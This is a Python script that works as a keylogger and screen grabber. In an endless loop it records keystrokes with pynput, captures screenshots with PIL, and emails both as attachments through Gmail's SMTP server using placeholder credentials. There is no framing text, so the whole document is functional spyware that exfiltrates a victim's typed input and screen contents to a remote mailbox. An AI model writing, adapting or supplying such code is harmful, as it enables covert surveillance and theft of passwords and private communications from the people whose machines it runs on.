import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from PIL import ImageGrab
from pynput import keyboard
import time

# Set up email parameters
sender_email = "Email_Address"
sender_password = "Password"
recipient_email = "Email_Address"

# Set up email message
msg = MIMEMultipart()
msg['From'] = sender_email
msg['To'] = recipient_email
msg['Subject'] = "Keylogger and Screenshot Report"

# Set up keylogger
keys = []

def on_press(key):
    global keys
    keys.append(key)

def clear_keys():
    global keys
    keys = []

# Set up screenshot
screenshot_filename = "screenshot.png"

# Main loop
while True:
    try:
        # Take screenshot and add as attachment
        im = ImageGrab.grab()
        im.save(screenshot_filename)
        with open(screenshot_filename, "rb") as f:
            part = MIMEApplication(f.read(), _subtype="png")
            part.add_header('content-disposition', 'attachment', filename=screenshot_filename)
            msg.attach(part)

        # Reset key buffer and start keylogger
        clear_keys()

        with keyboard.Listener(on_press=on_press) as listener:
            time.sleep(60)
            listener.stop()

        # Write keylogs to file
        with open("keylogs.txt", "w") as f:
            for key in keys:
                f.write(str(key))

        # Add keylogs as attachment
        with open("keylogs.txt", "rb") as f:
            part = MIMEApplication(f.read(), _subtype="txt")
            part.add_header('content-disposition', 'attachment', filename="keylogs.txt")
            msg.attach(part)

        # Send email
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        text = msg.as_string()
        server.sendmail(sender_email, recipient_email, text)
        server.quit()

        # Wait before repeating
        time.sleep(60)

    except Exception as e:
        print("An error occurred:", e)
